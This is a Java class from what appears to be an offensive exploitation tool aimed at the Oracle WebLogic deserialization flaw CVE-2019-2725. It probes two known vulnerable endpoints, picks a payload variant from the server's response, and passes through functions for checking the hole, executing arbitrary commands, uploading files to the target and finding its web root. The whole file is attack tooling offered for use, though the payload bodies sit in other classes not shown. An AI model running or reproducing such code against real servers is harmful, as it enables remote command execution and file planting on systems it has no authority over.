/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.js.codeexec.paylaod;

import com.js.codeexec.tools.Base64Utils;
import com.js.codeexec.tools.HttpTool;

/**
 *
 * @author shack2
 */
public class CVE_2019_2725_12 implements BasePayload {
    private static final String VULURL1="/wls-wsat/CoordinatorPortType";
    private static final String VULURL2="/_async/AsyncResponseService";

    public BasePayload getPayload(String url) throws Exception{ 
         BasePayload bp=null;
        try {
            String result=HttpTool.getHttpReuest(url+VULURL1,"UTF-8");
            if(result.indexOf("schemas.xmlsoap.org")!=-1){
                bp=new CVE_2019_2725_12_1();
            }
            else{
                 bp=new CVE_2019_2725_12_2();
            }
        } catch (Exception e) {
           throw e;
        }
        return bp;
        
    }
    
    
    @Override
    public boolean checkVUL(String url) throws Exception{ 
        return getPayload(url).checkVUL(url); 
    }

    @Override
    public String exeCMD(String url, String cmd,String encoding)  throws Exception{
        return getPayload(url).exeCMD(url,cmd,encoding);
    }

    @Override
    public String uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
        return getPayload(url).uploadFile(url,fileContent,filename,useUserPath);
    }

    @Override
    public String getWebPath(String url) throws Exception {
        return getPayload(url).getWebPath(url);
    }
    
}